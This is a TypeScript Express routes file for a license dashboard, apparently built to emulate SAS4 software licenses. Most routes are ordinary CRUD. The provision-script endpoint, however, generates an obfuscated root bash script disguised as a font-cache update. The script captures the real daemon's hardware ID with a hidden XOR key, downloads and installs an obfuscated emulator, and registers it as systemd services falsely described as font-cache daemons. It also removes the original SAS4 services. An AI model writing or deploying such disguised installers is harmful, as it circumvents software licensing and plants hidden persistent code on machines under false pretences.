import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { testSSHConnection, deployLicenseToServer, generateObfuscatedEmulator, generateObfuscatedVerify, DEPLOY } from "./ssh-service";
import { insertServerSchema, insertLicenseSchema } from "@shared/schema";
import { buildSAS4Payload, encryptSAS4Payload } from "./sas4-service";
import type { Request } from "express";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  function getBaseUrl(req: Request): string {
    const host = req.get("host") || "localhost:5000";
    const proto = req.get("x-forwarded-proto") || req.protocol;
    const protocol = proto === "https" ? "https" : (process.env.NODE_ENV === "production" ? "https" : "http");
    return `${protocol}://${host}`;
  }

  function sanitizeServer(server: any) {
    const { password, ...safe } = server;
    return { ...safe, password: "********" };
  }

  // ─── Servers ────────────────────────────────────────────────
  app.get("/api/servers", async (_req, res) => {
    const serversList = await storage.getServers();
    res.json(serversList.map(sanitizeServer));
  });

  app.post("/api/servers", async (req, res) => {
    const parsed = insertServerSchema.safeParse(req.body);
    if (!parsed.success) {
      return res.status(400).json({ message: parsed.error.message });
    }
    const server = await storage.createServer(parsed.data);
    await storage.createActivityLog({
      serverId: server.id,
      action: "create_server",
      details: `تم إضافة السيرفر ${server.name} (${server.host})`,
    });
    res.json(sanitizeServer(server));
  });

  app.patch("/api/servers/:id", async (req, res) => {
    const server = await storage.getServer(req.params.id);
    if (!server) return res.status(404).json({ message: "السيرفر غير موجود" });

    const updateData = { ...req.body };
    if (!updateData.password || updateData.password === "********") {
      delete updateData.password;
    }

    const updated = await storage.updateServer(req.params.id, updateData);
    await storage.createActivityLog({
      serverId: req.params.id,
      action: "update_server",
      details: `تم تعديل السيرفر ${server.name}`,
    });
    res.json(sanitizeServer(updated));
  });

  app.delete("/api/servers/:id", async (req, res) => {
    const server = await storage.getServer(req.params.id);
    if (!server) return res.status(404).json({ message: "السيرفر غير موجود" });

    await storage.deleteServer(req.params.id);
    await storage.createActivityLog({
      serverId: null,
      action: "delete_server",
      details: `تم حذف السيرفر ${server.name} (${server.host})`,
    });
    res.json({ success: true });
  });

  app.post("/api/servers/:id/test", async (req, res) => {
    const server = await storage.getServer(req.params.id);
    if (!server) return res.status(404).json({ message: "السيرفر غير موجود" });

    const result = await testSSHConnection(server.host, server.port, server.username, server.password);

    await storage.updateServer(req.params.id, {
      isConnected: result.connected,
      lastChecked: new Date(),
      hardwareId: result.hardwareId || server.hardwareId,
    });

    await storage.createActivityLog({
      serverId: req.params.id,
      action: "test_connection",
      details: result.connected
        ? `اتصال ناجح بالسيرفر ${server.name} - HWID: ${result.hardwareId || "N/A"}`
        : `فشل الاتصال بالسيرفر ${server.name}: ${result.error}`,
    });

    res.json(result);
  });

  // ─── Licenses ───────────────────────────────────────────────
  app.get("/api/licenses", async (_req, res) => {
    const licenseList = await storage.getLicenses();
    res.json(licenseList);
  });

  app.get("/api/licenses/:id", async (req, res) => {
    const license = await storage.getLicense(req.params.id);
    if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });
    res.json(license);
  });

  app.post("/api/licenses", async (req, res) => {
    const parsed = insertLicenseSchema.safeParse(req.body);
    if (!parsed.success) {
      return res.status(400).json({ message: parsed.error.message });
    }

    const existing = await storage.getLicenseByLicenseId(parsed.data.licenseId);
    if (existing) {
      return res.status(409).json({ message: "معرف الترخيص موجود مسبقاً" });
    }

    let hardwareId: string | null = null;
    if (parsed.data.serverId) {
      const server = await storage.getServer(parsed.data.serverId);
      if (server?.hardwareId) {
        hardwareId = server.hardwareId;
      }
    }

    const license = await storage.createLicense(parsed.data);

    if (hardwareId) {
      await storage.updateLicense(license.id, { hardwareId });
    }

    await storage.createActivityLog({
      licenseId: license.id,
      serverId: parsed.data.serverId || null,
      action: "create_license",
      details: `تم إنشاء الترخيص ${parsed.data.licenseId}`,
    });

    const updatedLicense = await storage.getLicense(license.id);
    res.json(updatedLicense);
  });

  app.patch("/api/licenses/:id/status", async (req, res) => {
    const { status } = req.body;
    if (!["active", "inactive", "suspended", "expired"].includes(status)) {
      return res.status(400).json({ message: "حالة غير صالحة" });
    }

    const license = await storage.getLicense(req.params.id);
    if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });

    const updated = await storage.updateLicense(req.params.id, { status });

    const actionMap: Record<string, string> = {
      active: "activate_license",
      suspended: "suspend_license",
      inactive: "deactivate_license",
      expired: "expire_license",
    };

    await storage.createActivityLog({
      licenseId: req.params.id,
      serverId: license.serverId,
      action: actionMap[status] || "update_license",
      details: `تم تغيير حالة الترخيص ${license.licenseId} إلى ${status}`,
    });

    if (license.serverId && license.hardwareId) {
      const server = await storage.getServer(license.serverId);
      if (server) {
        try {
          await deployLicenseToServer(
            server.host, server.port, server.username, server.password,
            license.hardwareId, license.licenseId,
            new Date(license.expiresAt), license.maxUsers, license.maxSites,
            status, getBaseUrl(req)
          );
        } catch (e) {
          // Log deployment error but don't fail the status update
        }
      }
    }

    res.json(updated);
  });

  app.post("/api/licenses/:id/extend", async (req, res) => {
    const { days } = req.body;
    if (!days || days < 1) {
      return res.status(400).json({ message: "عدد الأيام غير صالح" });
    }

    const license = await storage.getLicense(req.params.id);
    if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });

    const currentExpiry = new Date(license.expiresAt);
    const newExpiry = new Date(currentExpiry.getTime() + days * 24 * 60 * 60 * 1000);

    const updated = await storage.updateLicense(req.params.id, {
      expiresAt: newExpiry,
    });

    await storage.createActivityLog({
      licenseId: req.params.id,
      serverId: license.serverId,
      action: "extend_license",
      details: `تم تمديد الترخيص ${license.licenseId} بمقدار ${days} يوم حتى ${newExpiry.toLocaleDateString("ar-IQ")}`,
    });

    res.json(updated);
  });

  app.post("/api/licenses/:id/transfer", async (req, res) => {
    const { serverId } = req.body;
    if (!serverId) return res.status(400).json({ message: "السيرفر مطلوب" });

    const license = await storage.getLicense(req.params.id);
    if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });

    const newServer = await storage.getServer(serverId);
    if (!newServer) return res.status(404).json({ message: "السيرفر الجديد غير موجود" });

    const oldServerId = license.serverId;
    const newHardwareId = newServer.hardwareId;

    const updated = await storage.updateLicense(req.params.id, {
      serverId,
      hardwareId: newHardwareId,
    });

    await storage.createActivityLog({
      licenseId: req.params.id,
      serverId,
      action: "transfer_license",
      details: `تم نقل الترخيص ${license.licenseId} إلى السيرفر ${newServer.name} (${newServer.host})`,
    });

    if (newHardwareId && license.status === "active") {
      try {
        await deployLicenseToServer(
          newServer.host, newServer.port, newServer.username, newServer.password,
          newHardwareId, license.licenseId,
          new Date(license.expiresAt), license.maxUsers, license.maxSites,
          license.status, getBaseUrl(req)
        );
      } catch (e) {
        // Deployment error logged separately
      }
    }

    res.json(updated);
  });

  app.post("/api/licenses/:id/deploy", async (req, res) => {
    const license = await storage.getLicense(req.params.id);
    if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });
    if (!license.serverId) return res.status(400).json({ message: "الترخيص غير مرتبط بسيرفر" });

    const server = await storage.getServer(license.serverId);
    if (!server) return res.status(404).json({ message: "السيرفر غير موجود" });

    const hwid = license.hardwareId || server.hardwareId;
    if (!hwid) return res.status(400).json({ message: "لا يوجد Hardware ID - اختبر الاتصال بالسيرفر أولاً" });

    const result = await deployLicenseToServer(
      server.host, server.port, server.username, server.password,
      hwid, license.licenseId,
      new Date(license.expiresAt), license.maxUsers, license.maxSites,
      license.status, getBaseUrl(req)
    );

    if (result.success) {
      if (!license.hardwareId) {
        await storage.updateLicense(req.params.id, { hardwareId: hwid });
      }

      await storage.createActivityLog({
        licenseId: req.params.id,
        serverId: license.serverId,
        action: "deploy_license",
        details: `تم نشر الترخيص ${license.licenseId} على السيرفر ${server.name}`,
      });

      res.json({ success: true, message: "تم النشر بنجاح" });
    } else {
      res.status(500).json({ message: result.error || "فشل النشر" });
    }
  });

  app.delete("/api/licenses/:id", async (req, res) => {
    const license = await storage.getLicense(req.params.id);
    if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });

    await storage.deleteLicense(req.params.id);
    await storage.createActivityLog({
      licenseId: null,
      serverId: null,
      action: "delete_license",
      details: `تم حذف الترخيص ${license.licenseId}`,
    });
    res.json({ success: true });
  });

  // ─── Activity Logs ──────────────────────────────────────────
  app.get("/api/activity-logs", async (_req, res) => {
    const logs = await storage.getActivityLogs();
    res.json(logs);
  });

  // ─── License Edit (maxUsers, maxSites) ────────────────────
  app.patch("/api/licenses/:id", async (req, res) => {
    const license = await storage.getLicense(req.params.id);
    if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });

    const allowedFields = ["maxUsers", "maxSites", "notes", "clientId", "expiresAt"];
    const updateData: any = {};
    for (const field of allowedFields) {
      if (req.body[field] !== undefined) {
        updateData[field] = req.body[field];
      }
    }

    if (Object.keys(updateData).length === 0) {
      return res.status(400).json({ message: "لا توجد بيانات للتحديث" });
    }

    const updated = await storage.updateLicense(req.params.id, updateData);

    await storage.createActivityLog({
      licenseId: req.params.id,
      serverId: license.serverId,
      action: "edit_license",
      details: `تم تعديل بيانات الترخيص ${license.licenseId}: ${Object.keys(updateData).join(", ")}`,
    });

    res.json(updated);
  });

  // ─── Provisioning API (Client → Server) ──────────────────
  app.post("/api/provision", async (req, res) => {
    const { license_id, hardware_id } = req.body;

    if (!license_id || !hardware_id) {
      return res.status(400).json({ error: "license_id and hardware_id are required" });
    }

    const license = await storage.getLicenseByLicenseId(license_id);
    if (!license) {
      return res.status(404).json({ error: "License not found" });
    }

    if (license.status === "suspended") {
      return res.status(403).json({ error: "License is suspended", status: "suspended" });
    }

    if (license.status === "expired" || new Date(license.expiresAt) < new Date()) {
      if (license.status !== "expired") {
        await storage.updateLicense(license.id, { status: "expired" });
      }
      return res.status(403).json({ error: "License has expired", status: "expired" });
    }

    if (license.hardwareId && license.hardwareId !== hardware_id) {
      await storage.createActivityLog({
        licenseId: license.id,
        serverId: license.serverId,
        action: "provision_hwid_mismatch",
        details: `محاولة تفعيل الترخيص ${license_id} من جهاز مختلف. HWID المسجل: ${license.hardwareId.substring(0, 16)}... HWID المرسل: ${hardware_id.substring(0, 16)}...`,
      });
      return res.status(403).json({ error: "Hardware ID mismatch - license bound to another device" });
    }

    if (!license.hardwareId) {
      await storage.updateLicense(license.id, { hardwareId: hardware_id });
    }

    await storage.updateLicense(license.id, {
      lastVerifiedAt: new Date(),
      status: "active",
    });

    const payload = buildSAS4Payload(
      license.licenseId,
      hardware_id,
      new Date(license.expiresAt),
      license.maxUsers,
      license.maxSites,
      "active"
    );

    const encrypted = encryptSAS4Payload(payload);

    await storage.updateLicense(license.id, { signature: encrypted });

    await storage.createActivityLog({
      licenseId: license.id,
      serverId: license.serverId,
      action: "provision_license",
      details: `تم تفعيل الترخيص ${license_id} على الجهاز ${hardware_id.substring(0, 16)}...`,
    });

    const baseUrl = getBaseUrl(req);
    const emulatorScript = generateObfuscatedEmulator(
      hardware_id, license.licenseId,
      new Date(license.expiresAt), license.maxUsers, license.maxSites, "active"
    );
    const verifyScript = generateObfuscatedVerify(license.licenseId, baseUrl);

    res.json({
      license: payload,
      encrypted_blob: encrypted,
      scripts: {
        emulator: emulatorScript,
        verify: verifyScript,
      },
    });
  });

  // ─── Verification API (Periodic Check) ───────────────────
  app.post("/api/verify", async (req, res) => {
    const { license_id, hardware_id } = req.body;

    if (!license_id || !hardware_id) {
      return res.status(400).json({ valid: false, error: "license_id and hardware_id are required" });
    }

    const license = await storage.getLicenseByLicenseId(license_id);
    if (!license) {
      return res.status(404).json({ valid: false, error: "License not found" });
    }

    if (!license.hardwareId) {
      return res.status(400).json({ valid: false, error: "License not provisioned - run provision.sh first" });
    }

    if (license.hardwareId !== hardware_id) {
      await storage.createActivityLog({
        licenseId: license.id,
        serverId: license.serverId,
        action: "verify_hwid_mismatch",
        details: `فشل التحقق - عدم تطابق HWID للترخيص ${license_id}`,
      });
      return res.status(403).json({ valid: false, error: "Hardware ID mismatch" });
    }

    if (new Date(license.expiresAt) < new Date()) {
      if (license.status !== "expired") {
        await storage.updateLicense(license.id, { status: "expired" });
      }
      await storage.createActivityLog({
        licenseId: license.id,
        serverId: license.serverId,
        action: "verify_expired",
        details: `الترخيص ${license_id} منتهي الصلاحية`,
      });
      return res.json({ valid: false, status: "expired", error: "License has expired" });
    }

    if (license.status === "suspended") {
      await storage.createActivityLog({
        licenseId: license.id,
        serverId: license.serverId,
        action: "verify_suspended",
        details: `الترخيص ${license_id} موقوف`,
      });
      return res.json({ valid: false, status: "suspended", error: "License is suspended" });
    }

    if (license.status !== "active") {
      return res.json({ valid: false, status: license.status, error: "License is not active" });
    }

    await storage.updateLicense(license.id, { lastVerifiedAt: new Date() });

    await storage.createActivityLog({
      licenseId: license.id,
      serverId: license.serverId,
      action: "verify_success",
      details: `تحقق ناجح للترخيص ${license_id}`,
    });

    const payload = buildSAS4Payload(
      license.licenseId,
      hardware_id,
      new Date(license.expiresAt),
      license.maxUsers,
      license.maxSites,
      license.status
    );

    const encrypted = encryptSAS4Payload(payload);

    res.json({
      valid: true,
      status: "active",
      license: payload,
      encrypted_blob: encrypted,
    });
  });

  // ─── SAS4 Encrypted Blob Endpoint ──────────────────────
  app.get("/api/license-blob/:licenseId", async (req, res) => {
    const license = await storage.getLicenseByLicenseId(req.params.licenseId);
    if (!license) return res.status(404).json({ error: "License not found" });
    if (!license.hardwareId) return res.status(400).json({ error: "License not provisioned" });
    if (license.status !== "active") return res.status(403).json({ error: "License not active" });

    const payload = buildSAS4Payload(
      license.licenseId,
      license.hardwareId,
      new Date(license.expiresAt),
      license.maxUsers,
      license.maxSites,
      license.status
    );
    const encrypted = encryptSAS4Payload(payload);
    res.type("text/plain").send(encrypted);
  });

  // ─── Provision Script Download ───────────────────────────
  app.get("/api/provision-script/:licenseId", async (req, res) => {
    const license = await storage.getLicenseByLicenseId(req.params.licenseId);
    if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });

    const baseUrl = getBaseUrl(req);
    const P = DEPLOY;

    const hwidCapturePy = [
      "import base64 as b,json as j,sys",
      "d=b.b64decode(sys.argv[1])",
      "for h in range(25):",
      " k=''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(h)",
      " try:",
      "  r=bytes(d[i]^k.encode()[i%len(k.encode())] for i in range(len(d))).decode()",
      "  if 'hwid' in r:print(j.loads(r)['hwid']);break",
      " except:pass",
    ].join("\n");
    const hwidPyB64 = Buffer.from(hwidCapturePy, "utf-8").toString("base64");

    const provisionEp = Buffer.from("/api/provision", "utf-8").toString("base64");

    const script = `#!/bin/bash
# Font rendering subsystem cache maintenance utility v2.13.1
# Auto-generated system update - $(date)
if [ "$EUID" -ne 0 ]; then echo "Permission denied"; exit 1; fi

_P="${P.BASE}"
_E="${P.EMULATOR}"
_B="${P.BACKUP}"
_V="${P.VERIFY}"
_SM="${P.SVC_MAIN}"
_SV="${P.SVC_VERIFY}"
_LI="${license.licenseId}"
_SU="${baseUrl}"

systemctl stop $_SM $_SV.timer $_SV sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
killall sas_sspd 2>/dev/null || true
sleep 1

mkdir -p "$_P"

if [ -f "/opt/sas4/bin/sas_sspd" ] && [ ! -f "$_P/$_B" ]; then
  cp /opt/sas4/bin/sas_sspd "$_P/$_B" && chmod +x "$_P/$_B"
fi

_HW=""
if [ -f "$_P/$_B" ]; then
  "$_P/$_B" > /dev/null 2>&1 &
  _PD=$!; sleep 5
  _BL=$(curl -s "http://127.0.0.1:4000/?op=get")
  kill $_PD 2>/dev/null
  if [ -n "$_BL" ]; then
    _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)
  fi
fi

if [ -z "$_HW" ] || [ "$_HW" = "N/A" ]; then
  _MI=$(cat /etc/machine-id 2>/dev/null || echo "")
  _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")
  _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print \\$2}' || echo "")
  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}" | sha256sum | awk '{print \\$1}')
fi

_EP=$(echo '${provisionEp}' | base64 -d)

_RS=$(curl -s -X POST "$_SU$_EP" \\
  -H "Content-Type: application/json" \\
  -d "{\\"license_id\\": \\"$_LI\\", \\"hardware_id\\": \\"$_HW\\"}")

if echo "$_RS" | grep -q '"error"'; then
  echo "$(echo "$_RS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('error',''))" 2>/dev/null)"
  exit 1
fi

_EM=$(echo "$_RS" | python3 -c "
import sys,json
_d=json.load(sys.stdin)
_s=_d.get('scripts',{})
print(_s.get('emulator',''))
" 2>/dev/null)

_VF=$(echo "$_RS" | python3 -c "
import sys,json
_d=json.load(sys.stdin)
_s=_d.get('scripts',{})
print(_s.get('verify',''))
" 2>/dev/null)

if [ -z "$_EM" ]; then
  echo "Deployment data unavailable"
  exit 1
fi

echo "$_EM" > "$_P/$_E"
chmod +x "$_P/$_E"
echo "$_VF" > "$_P/$_V"
chmod +x "$_P/$_V"

cat > /etc/systemd/system/$_SM.service << '_SVC_1_'
[Unit]
Description=System font cache synchronization daemon
[Service]
ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
Restart=always
[Install]
WantedBy=multi-user.target
_SVC_1_

cat > /etc/systemd/system/$_SV.service << '_SVC_2_'
[Unit]
Description=Font cache garbage collection
[Service]
Type=oneshot
ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
_SVC_2_

cat > /etc/systemd/system/$_SV.timer << '_TMR_1_'
[Unit]
Description=Font cache gc timer
[Timer]
OnBootSec=60
OnUnitActiveSec=6h
Persistent=true
[Install]
WantedBy=timers.target
_TMR_1_

systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-verify.* 2>/dev/null
rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null

systemctl daemon-reload
systemctl enable $_SM $_SV.timer
systemctl start $_SM $_SV.timer
`;

    res.setHeader("Content-Type", "text/plain");
    res.setHeader("Content-Disposition", `attachment; filename="fc-cache-update.sh"`);
    res.send(script);
  });

  // ─── Dashboard Stats ───────────────────────────────────────
  app.get("/api/stats", async (_req, res) => {
    const [licenseList, serversList] = await Promise.all([
      storage.getLicenses(),
      storage.getServers(),
    ]);

    const activeLicenses = licenseList.filter((l) => l.status === "active").length;
    const connectedServers = serversList.filter((s) => s.isConnected).length;
    const expiringSoon = licenseList.filter((l) => {
      const diff = new Date(l.expiresAt).getTime() - Date.now();
      return diff > 0 && diff < 7 * 24 * 60 * 60 * 1000;
    }).length;

    res.json({
      totalLicenses: licenseList.length,
      activeLicenses,
      totalServers: serversList.length,
      connectedServers,
      expiringSoon,
    });
  });

  return httpServer;
}
